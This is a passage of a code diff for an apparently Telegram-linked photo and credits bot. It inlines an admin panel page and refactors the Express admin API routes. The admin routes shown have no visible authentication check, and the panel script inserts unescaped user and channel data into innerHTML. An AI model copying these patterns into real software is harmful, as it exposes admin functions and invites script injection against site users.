-                <div style="font-size:12px;color:#888;">Referred by: \${data.referredBy||'None'}</div>
-            </div>
-        \`).join('');
-    }catch(err){showToast('Error loading users',true);}
-}
-
-async function searchUser(){
-    const uid=document.getElementById('searchUser').value.trim();
-    if(!uid){showToast('Enter User ID',true);return;}
-    try{
-        const r=await fetch(\`/api/admin/user/\${uid}\`);
-        const user=await r.json();
-        if(user.error){showToast('User not found',true);return;}
-        document.getElementById('userList').innerHTML=\`
-            <div class="user-card">
-                <div class="uid">🆔 \${uid}</div>
-                <div>⭐ Credits: \${user.unlimited?'♾️ Unlimited':user.credits||0}</div>
-                <div>👥 Referrals: \${user.totalReferrals||0}</div>
-                <div>📅 Joined: \${new Date(user.joinedAt).toLocaleDateString()}</div>
-                <div>Referred by: \${user.referredBy||'None'}</div>
-            </div>
-        \`;
-    }catch(err){showToast('Error',true);}
-}
-
-async function modifyCredits(){
-    const uid=document.getElementById('userIdInput').value.trim();
-    const amount=parseInt(document.getElementById('creditAmount').value);
-    if(!uid||isNaN(amount)){showToast('Enter valid User ID and amount',true);return;}
-    try{
-        const r=await fetch('/api/admin/modify-credits',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid,amount})});
-        const data=await r.json();
-        if(data.success){showToast(\`Updated! New: \${data.credits}\`);loadUsers();}
-        else showToast('Update failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function toggleUnlimited(){
-    const uid=document.getElementById('userIdInput').value.trim();
-    if(!uid){showToast('Enter User ID',true);return;}
-    try{
-        const r=await fetch('/api/admin/toggle-unlimited',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid})});
-        const data=await r.json();
-        if(data.success){showToast(\`Unlimited: \${data.unlimited?'ON':'OFF'}\`);loadUsers();}
-        else showToast('Toggle failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-// FEATURED
-async function loadFeatured(){
-    try{
-        const r=await fetch('/api/admin/featured');
-        const data=await r.json();
-        const photos=await fetch('/api/admin/photos').then(r=>r.json());
-        const select=document.getElementById('featuredPhotoSelect');
-        select.innerHTML='<option value="">Select a photo...</option>';
-        photos.photos.forEach(p=>{
-            const opt=document.createElement('option');
-            opt.value=p.id;
-            opt.textContent=p.caption||p.filename;
-            if(data.photo===p.id) opt.selected=true;
-            select.appendChild(opt);
-        });
-        const preview=document.getElementById('featuredPreview');
-        if(data.photoData){preview.innerHTML=\`<img src="\${data.photoData.url}" style="max-width:200px;border-radius:10px;border:1px solid #2a2a4a;">\`;}
-        else {preview.innerHTML='<p style="color:#888;">No featured photo</p>';}
-        document.getElementById('featuredMessageDisplay').innerHTML=\`<strong>Current:</strong> \${data.message||'No message'}\`;
-        document.getElementById('featuredMessage').value=data.message||'';
-        const statusEl=document.getElementById('featuredStatus');
-        if(data.status){statusEl.className='status-badge status-active';statusEl.textContent='✅ Active';}
-        else {statusEl.className='status-badge status-inactive';statusEl.textContent='❌ Inactive';}
-    }catch(err){showToast('Error loading featured',true);}
-}
-
-async function setFeaturedPhoto(){
-    const photoId=document.getElementById('featuredPhotoSelect').value;
-    if(!photoId){showToast('Select a photo',true);return;}
-    try{
-        const r=await fetch('/api/admin/featured/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photoId})});
-        if(r.ok){showToast('Featured photo updated!');loadFeatured();}
-        else showToast('Update failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function removeFeaturedPhoto(){
-    try{
-        const r=await fetch('/api/admin/featured/photo',{method:'DELETE'});
-        if(r.ok){showToast('Removed!');loadFeatured();}
-        else showToast('Remove failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function setFeaturedMessage(){
-    const message=document.getElementById('featuredMessage').value.trim();
-    if(!message){showToast('Enter a message',true);return;}
-    try{
-        const r=await fetch('/api/admin/featured/message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
-        if(r.ok){showToast('Message updated!');loadFeatured();}
-        else showToast('Update failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function toggleFeaturedStatus(){
-    try{
-        const r=await fetch('/api/admin/featured/toggle',{method:'POST'});
-        if(r.ok){showToast('Status toggled!');loadFeatured();}
-        else showToast('Toggle failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-// QR
-async function loadQR(){
-    try{
-        const r=await fetch('/api/admin/qr');
-        const data=await r.json();
-        const preview=document.getElementById('qrPreview');
-        if(data.url){
-            preview.style.display='block';
-            document.getElementById('qrImage').src='/api/admin/qr?t='+Date.now();
-        }else{
-            preview.style.display='none';
-        }
-    }catch(err){}
-}
-
-async function uploadQR(){
-    const file=document.getElementById('qrUpload').files[0];
-    if(!file){showToast('Select an image',true);return;}
-    const fd=new FormData();fd.append('qr',file);
-    try{
-        const r=await fetch('/api/admin/upload-qr',{method:'POST',body:fd});
-        const data=await r.json();
-        if(data.success){
-            showToast('QR uploaded!');
-            loadQR();
-        }else showToast('Upload failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function removeQR(){
-    if(!confirm('Remove QR code?'))return;
-    try{
-        const r=await fetch('/api/admin/remove-qr',{method:'DELETE'});
-        if(r.ok){showToast('QR removed!');loadQR();}
-        else showToast('Remove failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-// LOGS
-async function loadLogs(){
-    try{
-        const r=await fetch('/api/admin/logs');
-        const data=await r.json();
-        document.getElementById('logsDisplay').textContent=data.logs || 'No logs available';
-    }catch(err){
-        document.getElementById('logsDisplay').textContent='Error loading logs';
-        showToast('Error loading logs',true);
-    }
-}
-
-async function clearLogs(){
-    if(!confirm('Clear all logs?'))return;
-    try{
-        const r=await fetch('/api/admin/logs',{method:'DELETE'});
-        if(r.ok){showToast('Logs cleared!');loadLogs();}
-        else showToast('Clear failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-// Load all
-loadPhotos();
-loadChannels();
-loadUsers();
-loadFeatured();
-loadQR();
-</script>
-</body>
-</html>`);
+app.get('/admin', function(req, res) {
+    res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s}.tab.active{background:#667eea;border-color:#667eea}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#667eea}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:#007bff;color:#fff}.btn-primary:hover{background:#0069d9}.btn-success{background:#28a745;color:#fff}.btn-success:hover{background:#218838}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#667eea}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#667eea;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}</style></head><body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div><div class="tabs"><div class="tab active" onclick="showTab(\'photos\')">📷 Photos</div><div class="tab" onclick="showTab(\'channels\')">📢 Channels</div><div class="tab" onclick="showTab(\'users\')">👥 Users</div><div class="tab" onclick="showTab(\'featured\')">⭐ Featured</div><div class="tab" onclick="showTab(\'qr\')">💰 QR</div><div class="tab" onclick="showTab(\'logs\')">📋 Logs</div><div class="tab" onclick="showTab(\'commands\')">📜 Commands</div></div><div id="tab-photos" class="tab-content active"><div class="stats" id="stats"></div><div class="upload-section"><h3>📤 Upload Photo</h3><form id="uploadForm" enctype="multipart/form-data"><input type="file" name="photo" accept="image/*" required><input type="text" name="caption" placeholder="Caption"><button type="submit" class="btn btn-primary">Upload</button></form></div><div id="photoGrid" class="grid"></div></div><div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div><div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div><div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div><div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2><div id="qrDisplay"><p style="color:#888;margin:20px 0">Upload payment QR code</p><input type="file" id="qrUpload" accept="image/*"><button class="btn btn-primary" onclick="uploadQR()">Upload QR</button><button class="btn btn-danger" onclick="removeQR()">Remove QR</button></div><div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;"><p style="color:#888;margin-bottom:10px;">Current QR Code:</p><img id="qrImage" src="" style="max-width:200px;border-radius:10px;"></div></div></div><div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div><div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands\n/admin - Open admin panel\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Activate unlimited\n/resetuser [userId] - Reset user\n/users - Show all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/setqr - Upload QR code (reply with image)\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits\n/credits - Check your credits\n/referral - Get referral link</pre></div></div></div><div id="toast" class="toast"></div><script>\nvar API_BASE=window.location.origin;\nfunction showToast(m,e){e=e||false;var t=document.getElementById("toast");t.textContent=m;t.className="toast"+(e?" error":"");t.style.display="block";setTimeout(function(){t.style.display="none"},3000);}\nfunction showTab(tab){document.querySelectorAll(".tab-content").forEach(function(t){t.classList.remove("active")});document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active")});document.getElementById("tab-"+tab).classList.add("active");document.querySelector(".tab[onclick=\\"showTab(\\\'"+tab+"\\\')\\"]").classList.add("active");if(tab==="channels")loadChannels();if(tab==="users")loadUsers();if(tab==="featured")loadFeatured();if(tab==="logs")loadLogs();if(tab==="qr")loadQR();}\nasync function loadPhotos(){try{var r=await fetch("/api/admin/photos");var d=await r.json();var photos=d.photos||[];var active=photos.filter(function(p){return p.active}).length;var total=photos.length;document.getElementById("stats").innerHTML="<div class=\\"stat-card\\"><div class=\\"number\\">"+total+"</div><div class=\\"label\\">Total</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+active+"</div><div class=\\"label\\">Active</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+(total-active)+"</div><div class=\\"label\\">Inactive</div></div>";var grid=document.getElementById("photoGrid");if(photos.length===0){grid.innerHTML="<div class=\\"empty\\"><i>📷</i>No photos</div>";return;}var html="";for(var i=0;i<photos.length;i++){var p=photos[i];html+="<div class=\\"card\\"><img src=\\""+p.url+"\\"><div class=\\"info\\"><div>"+(p.caption||"No caption")+"</div><div style=\\"font-size:12px;color:#888;\\">"+new Date(p.uploadedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:"+(p.active?"#28a745":"#dc3545")+";\\">"+(p.active?"✅ Active":"❌ Inactive")+"</div></div><div class=\\"actions\\"><button class=\\"btn btn-warning\\" onclick=\\"togglePhoto(\\\'"+p.id+"\\\')\\">"+(p.active?"Hide":"Show")+"</button><button class=\\"btn btn-danger\\" onclick=\\"deletePhoto(\\\'"+p.id+"\\\')\\">Delete</button></div></div>";}grid.innerHTML=html;}catch(err){showToast("Error loading photos",true);}}\nasync function deletePhoto(id){if(!confirm("Delete?"))return;try{var r=await fetch("/api/admin/photos/"+id,{method:"DELETE"});if(r.ok){showToast("Deleted!");loadPhotos();}else showToast("Delete failed",true);}catch(err){showToast("Error",true);}}\nasync function togglePhoto(id){try{var r=await fetch("/api/admin/photos/"+id+"/toggle",{method:"PATCH"});if(r.ok){showToast("Toggled!");loadPhotos();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\ndocument.getElementById("uploadForm").addEventListener("submit",async function(e){e.preventDefault();var fd=new FormData(e.target);try{var r=await fetch("/api/admin/upload",{method:"POST",body:fd});if(r.ok){showToast("Uploaded!");e.target.reset();loadPhotos();loadFeatured();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}});\nasync function loadChannels(){try{var r=await fetch("/api/admin/channels");var channels=await r.json();var list=document.getElementById("channelList");if(channels.length===0){list.innerHTML="<div class=\\"empty\\"><i>📢</i>No channels</div>";return;}var html="";for(var i=0;i<channels.length;i++){var c=channels[i];html+="<div class=\\"channel-item\\"><div><div class=\\"name\\">"+c.name+"</div><div class=\\"id\\">"+c.id+"</div></div><div><a href=\\""+c.link+"\\" target=\\"_blank\\" class=\\"btn btn-primary\\">Visit</a><button class=\\"btn btn-danger\\" onclick=\\"removeChannel(\\\'"+c.id+"\\\')\\">Remove</button></div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading channels",true);}}\nasync function addChannel(){var id=document.getElementById("channelId").value.trim();var name=document.getElementById("channelName").value.trim();var link=document.getElementById("channelLink").value.trim();if(!id||!name||!link){showToast("Fill all fields",true);return;}try{var r=await fetch("/api/admin/channels",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:id,name:name,link:link})});if(r.ok){showToast("Channel added!");["channelId","channelName","channelLink"].forEach(function(i){document.getElementById(i).value=""});loadChannels();}else showToast("Add failed",true);}catch(err){showToast("Error",true);}}\nasync function removeChannel(id){if(!confirm("Remove?"))return;try{var r=await fetch("/api/admin/channels/"+id,{method:"DELETE"});if(r.ok){showToast("Removed!");loadChannels();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadUsers(){try{var r=await fetch("/api/admin/users");var users=await r.json();var list=document.getElementById("userList");var entries=Object.entries(users);if(entries.length===0){list.innerHTML="<div class=\\"empty\\"><i>👥</i>No users</div>";return;}var html="";for(var i=0;i<entries.length;i++){var id=entries[i][0];var data=entries[i][1];html+="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+id+"</div><div>⭐ Credits: "+(data.unlimited?"♾️ Unlimited":data.credits||0)+"</div><div>👥 Referrals: "+(data.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(data.joinedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:#888;\\">Referred by: "+(data.referredBy||"None")+"</div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading users",true);}}\nasync function searchUser(){var uid=document.getElementById("searchUser").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/user/"+uid);var user=await r.json();if(user.error){showToast("User not found",true);return;}document.getElementById("userList").innerHTML="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+uid+"</div><div>⭐ Credits: "+(user.unlimited?"♾️ Unlimited":user.credits||0)+"</div><div>👥 Referrals: "+(user.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(user.joinedAt).toLocaleDateString()+"</div><div>Referred by: "+(user.referredBy||"None")+"</div></div>";}catch(err){showToast("Error",true);}}\nasync function modifyCredits(){var uid=document.getElementById("userIdInput").value.trim();var amount=parseInt(document.getElementById("creditAmount").value);if(!uid||isNaN(amount)){showToast("Enter valid User ID and amount",true);return;}try{var r=await fetch("/api/admin/modify-credits",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:amount})});var data=await r.json();if(data.success){showToast("Updated! New: "+data.credits);loadUsers();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleUnlimited(){var uid=document.getElementById("userIdInput").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/toggle-unlimited",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})});var data=await r.json();if(data.success){showToast("Unlimited: "+(data.unlimited?"ON":"OFF"));loadUsers();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadFeatured(){try{var r=await fetch("/api/admin/featured");var data=await r.json();var photos=await fetch("/api/admin/photos").then(function(r){return r.json()});var select=document.getElementById("featuredPhotoSelect");select.innerHTML="<option value=\\"\\">Select a photo...</option>";for(var i=0;i<photos.photos.length;i++){var p=photos.photos[i];var opt=document.createElement("option");opt.value=p.id;opt.textContent=p.caption||p.filename;if(data.photo===p.id)opt.selected=true;select.appendChild(opt);}var preview=document.getElementById("featuredPreview");if(data.photoData){preview.innerHTML="<img src=\\""+data.photoData.url+"\\" style=\\"max-width:200px;border-radius:10px;border:1px solid #2a2a4a;\\">";}else{preview.innerHTML="<p style=\\"color:#888;\\">No featured photo</p>";}document.getElementById("featuredMessageDisplay").innerHTML="<strong>Current:</strong> "+(data.message||"No message");document.getElementById("featuredMessage").value=data.message||"";var statusEl=document.getElementById("featuredStatus");if(data.status){statusEl.className="status-badge status-active";statusEl.textContent="✅ Active";}else{statusEl.className="status-badge status-inactive";statusEl.textContent="❌ Inactive";}}catch(err){showToast("Error loading featured",true);}}\nasync function setFeaturedPhoto(){var photoId=document.getElementById("featuredPhotoSelect").value;if(!photoId){showToast("Select a photo",true);return;}try{var r=await fetch("/api/admin/featured/photo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photoId:photoId})});if(r.ok){showToast("Featured photo updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadQR(){try{var r=await fetch("/api/admin/qr");var data=await r.json();var preview=document.getElementById("qrPreview");if(data.url){preview.style.display="block";document.getElementById("qrImage").src="/api/admin/qr?t="+Date.now();}else{preview.style.display="none";}}catch(err){}}\nasync function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("QR uploaded!");loadQR();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}}\nasync function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("QR removed!");loadQR();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}\nasync function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}\nloadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();\n</script></body></html>');
 });
 
 // ====================== ADMIN API ======================
-app.get('/api/admin/photos', (req, res) => res.json({ photos: getPhotos(), total: getPhotos().length }));
+app.get('/api/admin/photos', function(req, res) {
+    res.json({ photos: getPhotos(), total: getPhotos().length });
+});
 
-app.post('/api/admin/upload', upload.single('photo'), (req, res) => {
+app.post('/api/admin/upload', upload.single('photo'), function(req, res) {
     try {
         if (!req.file) return res.status(400).json({ error: 'No file' });
-        const photo = addPhoto(req.file, req.body.caption || '');
-        res.json({ success: true, photo });
-    } catch (err) { res.status(500).json({ error: err.message }); }
+        var photo = addPhoto(req.file, req.body.caption || '');
+        res.json({ success: true, photo: photo });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
 });
 
-app.delete('/api/admin/photos/:id', (req, res) => res.json({ success: deletePhoto(req.params.id) }));
-
-app.patch('/api/admin/photos/:id/toggle', (req, res) => {
-    const photo = togglePhoto(req.params.id);
-    res.json({ success: !!photo, photo });
+app.delete('/api/admin/photos/:id', function(req, res) {
+    res.json({ success: deletePhoto(req.params.id) });
 });
 
-// Channels API
-app.get('/api/admin/channels', (req, res) => res.json(getChannels()));
-
-app.post('/api/admin/channels', (req, res) => {
-    const { id, name, link } = req.body;
-    if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
-    res.json(addChannel(id, name, link));
+app.patch('/api/admin/photos/:id/toggle', function(req, res) {
+    var photo = togglePhoto(req.params.id);
+    res.json({ success: !!photo, photo: photo });
 });
 
-app.delete('/api/admin/channels/:id', (req, res) => res.json(removeChannel(req.params.id)));
+app.get('/api/admin/channels', function(req, res) {
+    res.json(getChannels());
+});
 
-// Users API
-app.get('/api/admin/users', (req, res) => res.json(getUsers()));
+app.post('/api/admin/channels', function(req, res) {
+    var body = req.body;
+    if (!body.id || !body.name || !body.link) {
+        return res.status(400).json({ error: 'Missing fields' });
+    }
+    res.json(addChannel(body.id, body.name, body.link));
+});
 
-app.get('/api/admin/user/:id', (req, res) => {
-    const user = getUser(req.params.id);
+app.delete('/api/admin/channels/:id', function(req, res) {
+    res.json(removeChannel(req.params.id));
+});
+
+app.get('/api/admin/users', function(req, res) {
+    res.json(getUsers());
+});
+
+app.get('/api/admin/user/:id', function(req, res) {
+    var user = getUser(req.params.id);
     if (!user) return res.json({ error: 'User not found' });
     res.json(user);
 });
 
-app.post('/api/admin/modify-credits', (req, res) => {
-    const { userId, amount } = req.body;
-    if (!userId || isNaN(amount)) return res.status(400).json({ error: 'Invalid data' });
-    const user = getUser(userId);
+app.post('/api/admin/modify-credits', function(req, res) {
+    var body = req.body;
+    if (!body.userId || isNaN(body.amount)) {
+        return res.status(400).json({ error: 'Invalid data' });
+    }
+    var user = getUser(body.userId);
     if (user.unlimited) return res.json({ success: true, credits: 'Unlimited' });
-    user.credits = Math.max(0, (user.credits || 0) + amount);
+    user.credits = Math.max(0, (user.credits || 0) + body.amount);
     saveUsers(getUsers());
     res.json({ success: true, credits: user.credits });
 });
 
-app.post('/api/admin/toggle-unlimited', (req, res) => {
-    const { userId } = req.body;
-    if (!userId) return res.status(400).json({ error: 'No userId' });
-    const user = getUser(userId);
+app.post('/api/admin/toggle-unlimited', function(req, res) {
+    var body = req.body;
+    if (!body.userId) return res.status(400).json({ error: 'No userId' });
+    var user = getUser(body.userId);
     user.unlimited = !user.unlimited;
     saveUsers(getUsers());
     res.json({ success: true, unlimited: user.unlimited });
 });
 
-// Featured API
-app.get('/api/admin/featured', (req, res) => {
-    const featured = getFeatured();
-    const photos = getPhotos();
+app.get('/api/admin/featured', function(req, res) {
+    var featured = getFeatured();
+    var photos = getPhotos();
     if (featured.photo) {
-        const photo = photos.find(p => p.id === featured.photo);
+        var photo = null;
+        for (var i = 0; i < photos.length; i++) {
+            if (photos[i].id === featured.photo) { photo = photos[i]; break; }
+        }
         featured.photoData = photo || null;
     }
     res.json(featured);
 });
 
-app.post('/api/admin/featured/photo', (req, res) => {
-    const { photoId } = req.body;
-    if (!photoId) return res.status(400).json({ error: 'No photo ID' });
-    const featured = setFeaturedPhoto(photoId);
-    res.json({ success: true, featured });
+app.post('/api/admin/featured/photo', function(req, res) {
+    var body = req.body;
+    if (!body.photoId) return res.status(400).json({ error: 'No photo ID' });
+    var featured = setFeaturedPhoto(body.photoId);
+    res.json({ success: true, featured: featured });
 });
 
-app.delete('/api/admin/featured/photo', (req, res) => {
-    const featured = getFeatured();
+app.delete('/api/admin/featured/photo', function(req, res) {
+    var featured = getFeatured();
     featured.photo = null;
     saveFeatured(featured);
     res.json({ success: true });
 });
 
-app.post('/api/admin/featured/message', (req, res) => {
-    const { message } = req.body;
-    if (!message) return res.status(400).json({ error: 'No message' });
-    const featured = setFeaturedMessage(message);
-    res.json({ success: true, featured });
+app.post('/api/admin/featured/message', function(req, res) {
+    var body = req.body;
+    if (!body.message) return res.status(400).json({ error: 'No message' });
+    var featured = setFeaturedMessage(body.message);
+    res.json({ success: true, featured: featured });
 });
 
-app.post('/api/admin/featured/toggle', (req, res) => {
